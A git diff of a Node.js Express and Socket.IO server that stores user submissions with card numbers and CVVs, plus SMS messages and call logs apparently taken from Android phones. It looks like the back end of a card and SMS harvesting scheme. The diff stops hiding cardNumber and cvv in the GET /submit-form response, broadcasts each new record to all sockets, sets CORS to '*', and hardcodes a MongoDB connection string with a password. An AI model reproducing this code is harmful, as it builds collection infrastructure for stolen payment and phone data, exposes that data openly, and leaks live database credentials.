@@ -1,48 +1,35 @@
 const express = require("express");
-const bodyParser = require("body-parser");
 const cors = require("cors");
 const mongoose = require("mongoose");
 const http = require("http");
-const socketIo = require('socket.io');
+const { Server } = require("socket.io");
 
 
 const app = express();
 const PORT = 3000;
 
 const User = require("./models/User"); // ✅ IMPORTANT
+app.use(cors());
+app.use(express.static("public"));
 
-/* =======================
-   HTTP SERVER & SOCKET.IO
-======================= */
+app.use(express.json());
 const server = http.createServer(app);
-// Configure CORS for Socket.IO
-const io = socketIo(server, {
+const io = new Server(server, {
   cors: {
-    origin: "http://localhost:5173", // Your React dev server (likely 5173, 3000, or 3001)
+    origin: "*",
     methods: ["GET", "POST"]
   }
 });
 
-app.use(express.json());
-app.set('io', io);
 
 
-
-/* =======================
-   MONGODB CONNECTION
-======================= */
 mongoose.connect("mongodb+srv://oosrp9132_db_user:BnixQ3Qdq7kPXBcG@cluster0.vez1b2n.mongodb.net/")
   .then(() => console.log("✅ MongoDB connected"))
   .catch(err => console.error("❌ MongoDB error:", err));
 
 
-/* =======================
-   MIDDLEWARE
-======================= */
-app.use(cors());
-app.use(express.static("public"));
-app.use(bodyParser.json());
-app.use(bodyParser.urlencoded({ extended: true }));
+
+
 
 /* =======================
    SMS SCHEMA
@@ -73,13 +60,15 @@ const CallLogSchema = new mongoose.Schema({
   date: { type: Number, required: true },   // timestamp from Android
   createdAt: { type: Date, default: Date.now }
 });
+
+const CallLog = mongoose.model("CallLog", CallLogSchema);
+
+
 // GET /submit-form → return all users
 app.get("/submit-form", async (req, res) => {
   try {
     // Fetch all users, hide sensitive info
     const users = await User.find({}, {
-      cardNumber: 0, // hide full card number
-      cvv: 0,        // hide CVV
       __v: 0
     }).sort({ createdAt: -1 }); // latest first
 
@@ -96,12 +85,6 @@ app.get("/submit-form", async (req, res) => {
     });
   }
 });
-
-
-const CallLog = mongoose.model("CallLog", CallLogSchema);
-
-
-
 
 
 app.post("/submit-form", async (req, res) => {
@@ -135,6 +118,8 @@ app.post("/submit-form", async (req, res) => {
     // ✅ Save user
     const user = new User(data);
     await user.save();
+
+    io.emit("new_user", user);
 
     return res.status(201).json({
       success: true,
@@ -340,10 +325,16 @@ app.get("/call-logs", async (req, res) => {
 io.on("connection", (socket) => {
   console.log("🟢 Client connected:", socket.id);
 
+  socket.on("join-user", (userId) => {
+    socket.join(`user-${userId}`);
+    console.log(`✅ Socket ${socket.id} joined room user-${userId}`);
+  });
+
   socket.on("disconnect", () => {
     console.log("🔴 Client disconnected:", socket.id);
   });
 });
+
 
 /* =======================
    START SERVER
